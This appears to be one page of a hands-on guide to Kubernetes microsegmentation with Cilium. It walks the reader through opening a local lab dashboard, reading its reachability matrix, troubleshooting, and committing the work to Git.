+<p>Now open Edge or Chrome on Windows and go to <code class="nw">http://localhost:5050</code>. WSL passes the port on to Windows, the same way it does for the portal. Once it has loaded, the page shows the following, from top to bottom.</p>
+<p>The heading reads <code class="nw">Policies: OFF</code>. Below it the topology drawing has every path line in blue except the grey line from Windows to frontend, since every path is open, and under the drawing is the same pod table you printed in step 4. The reachability matrix has seven rows and six columns. Thirty-six cells say <code class="nw">open</code> on a blue background, and six cells on the diagonal say <code class="nw">self</code> with no color. Ops has no <code class="nw">self</code> cell because it isn't a target. Above the table, the summary reads <code class="nw">36 of 36 paths reachable</code>. The attack and drops sections stay empty until you click their buttons.</p>
+<p>Click <strong>Refresh</strong> in the Recent Hubble drops section. It shows <code class="nw">(no drops)</code> or a few flow lines, the same as the drops route in step 7, as long as the Hubble tunnel is running.</p>
+<p>Don't click <strong>Run attack</strong> or <strong>Apply policies</strong> yet. The attack changes Omar's grade, which <a href="ch08.html">chapter 8</a> needs to see at 58 first, and the policy files don't exist until <a href="ch10.html">chapter 10</a>. The page is longer than one screen, so take two screenshots, one of the top half and one of the bottom half after you scroll down. Press Windows+PrtScn for each, which saves the full screen with the taskbar clock to the <code class="nw">Pictures\Screenshots</code> folder. Rename them <code class="nw">ch09-dashboard-top.png</code> and <code class="nw">ch09-dashboard-bottom.png</code>. They're your "before" pictures for the report.</p>
+<p class="ifnot"><strong>If you see this instead</strong></p>
+<p>The browser says it can't reach the page or that localhost refused to connect. The dashboard isn't running, or Ubuntu was stopped when you closed its last window. Look at the dashboard's terminal and start it again as in step 3.</p>
+<p>The heading stays at <code class="nw">Policies: loading...</code> and the summary stays at <code class="nw">Probing (a few seconds)...</code>. The page loaded, but its calls to the routes failed. Look at the dashboard's terminal, where the last line of the traceback names the error, then repeat the curl tests of steps 4 and 6, which show the same failure more plainly.</p>
+<p>You ran the attack anyway. Reset the database with <code>kubectl -n campus rollout restart deployment/db</code> before you start <a href="ch08.html">chapter 8</a>.</p>
+<h2 id="checkpoint">Checkpoint</h2>
+<p>Ask the matrix route for the two counts once more.</p>
+<figure class="code cmd"><figcaption><span class="lbl">Ubuntu terminal</span><button type="button" class="copy" aria-label="Copy this command">Copy</button></figcaption><pre dir="ltr"><code>curl -s localhost:5050/api/matrix | jq -c &#x27;{open, total}&#x27;</code></pre></figure>
+<p>It must read exactly <code class="nw">{"open":36,"total":36}</code>, and the dashboard page must show <code class="nw">36 of 36 paths reachable</code> after you click the matrix's <strong>Refresh</strong> button. Don't start <a href="ch08.html">chapter 8</a> until both match.</p>
+<p>Save your work in Git.</p>
+<figure class="code cmd"><figcaption><span class="lbl">Ubuntu terminal</span><button type="button" class="copy" aria-label="Copy this command">Copy</button></figcaption><pre dir="ltr"><code>cd ~/microseg &amp;&amp; git add -A &amp;&amp; git commit -m &quot;ch07: dashboard&quot;</code></pre></figure>
+<p>The first line starts with <code class="nw">[main</code> and a short code that differs on your laptop, followed by your message. The next line counts the files changed, which is 2 if your last commit came at the end of <a href="ch06.html">chapter 6</a>, for <code class="nw">dashboard/app.py</code> and <code class="nw">dashboard/index.html</code>. The <code class="nw">__pycache__</code> folder isn't in it, because <code class="nw">.gitignore</code> leaves it out.</p>
+<!-- OUT ids: ch09-compile, ch09-start, ch09-status, ch09-status-pods, ch09-probe-by-hand, ch09-matrix-flat, ch09-matrix-flat-full, ch09-policies-remove, ch09-hubble-status, ch09-drops, ch09-index, ch09-checkpoint, ch09-commit --><nav class="pager" aria-label="Chapters"><a rel="prev" href="ch06.html"><span>Previous chapter</span>Chapter 6. Deploy the portal</a><a rel="next" href="ch08.html"><span>Next chapter</span>Chapter 8. Attack the flat network</a></nav></main></div>
+<footer class="foot"><div class="foot-in"><p>Kubernetes 1.36, Cilium 1.20.5 and kind 0.33.0 on Windows 11 with WSL 2. Every command was run on a real laptop in November 2026.</p><p><a href="https://github.com/0nlymohammed/ghufran-fyp-guide">Source on GitHub</a></p></div></footer>
+<p class="vh" aria-live="polite" id="live"></p>
+<script type="application/json" id="i18n">{"copied": "Copied", "copyFail": "Press Ctrl+C to copy the selected text", "doneOf": "{d} of {t} steps done", "next": "Next step: {s}", "allDone": "All {t} steps done.", "sumCount": "{d} of {t} done", "cleared": "All ticks cleared.", "confirm": "Clear every tick on this page? Your files and your cluster stay as they are.", "stageCount": "{d} of {t}"}</script>
+<script src="../assets/site.js" defer></script>
+</body>
+</html>
